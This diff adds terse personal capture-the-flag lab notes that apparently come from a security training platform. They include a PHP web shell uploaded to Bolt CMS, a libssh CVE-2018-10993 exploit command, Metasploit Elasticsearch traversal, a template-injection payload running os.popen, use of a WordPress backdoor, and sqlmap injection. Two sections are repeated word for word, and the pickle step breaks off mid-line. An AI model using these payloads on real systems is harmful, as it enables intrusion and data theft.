@@ -1,0 +1,87 @@
+Lab BOLT
+View source add “bolt” to url
+Admin/password
+On file management we need to use php which helps to create reverse shell
+(Create any file and write <?php echo system($_GET[‘cmd’]);?>  (command is waiting for command in cmd)  (php format file or txt rename to html)
+Then upload the file to bolt website
+We can right click and (options) remove the extension txt and leave php extension
+cmd=id ——write to the link
+They type cmd= cat%20/flag.txt
+
+LAB ELASTIC
+Msfconsole > search elasticsearch >dir trav use 2 > info >set rhost [url] > set rport [port] > info to see if worked > run
+File saved in /home/….
+Exit and > cat /home/kali….
+LAB LIBSSH
+Nmap -sV -sC -p 31454 34.141… -Pn
+Python3 libssh.py 34.141….. -p 31367 -c “cd ..;cat flag.txt”
+Cve-2018-10993
+
+LAB ELASTIC
+Msfconsole > search elasticsearch >dir trav use 2 > info >set rhost [url] > set rport [port] > info to see if worked > run
+File saved in /home/….
+Exit and > cat /home/kali….
+LAB LIBSSH
+Nmap -sV -sC -p 31454 34.141… -Pn
+Python3 libssh.py 34.141….. -p 31367 -c “cd ..;cat flag.txt”
+Cve-2018-10993
+
+LAB NODIFF-BACKDOOR
+Dirsearch -u https:// and found /backup.zip
+Wget http://ip:port/backup.zip
+Extract here the zip
+Cd backup
+Grep -r “shell_exec(”
+Got wp-content > go to folder
+See the code and in url ip:port?welldone=knockknock&shazam=cat flag.php
+Ctf in page source
+
+LAB SHARK
+Test with ${7*7}
+Go to burp 
+Forward > write in smth > submit > name=smth >
+Name=
+<%
+Import os
+X=os.popen(‘cat flag’).read()
+%>
+${x} > repeater > send
+
+LAB AUTHORIZATION
+./dirsearch.py -u http:… -w db/dicc.txt (in idea after this we get list of /auth /client_secrets.json etc)
+Try checking first route /auth by pasting in url  not allowed to GET requests so try to use POST in burp
+To check user credentials paste /client_secrets.json
+Go back to /auth route and try again to do a POST request with the credentials
+Content-type:application/json
+{
+ “username”:”admin”,
+ “password”:”admin”
+}
+Back to secret route and add the jwt toke authorization to get flag
+
+NETWORK SNIFFING
+LAB ONLINE-ENCRYPTION
+Search filtered traffic – http
+Follow http stream
+Txtwizard.net is our suspicious traffic
+Change “entire conversation” below and we get some kind of ip
+Now we can copy the messages and filter them with regexes in a text edition with and implemented engine to get plainText argument
+plainText=(.*?)&key
+decode from base64
+decode rot13 (given flag)
+
+LAB SWEET-AND-SOUR
+Try decode cookie using base64
+Echo -n “…” | base64 -d
+Based on data we gathered(python serv, cookies in base64) we can conclude its pickle server
+In Python code paste : 
+t = requests.get(http://...:.../dashboard,
+
+LAB SCHEMATICS
+Schematics
+Go to register.php
+Admin : mikheil
+Once we login using new credentials we can see page with search field
+If it responds to % in field it is vulnerable to sqli
+Copy the cookie from rhe POST request obtained with burp
+Sqlmap –cookie=”” -u https:/index.php –forms –columns –random agent
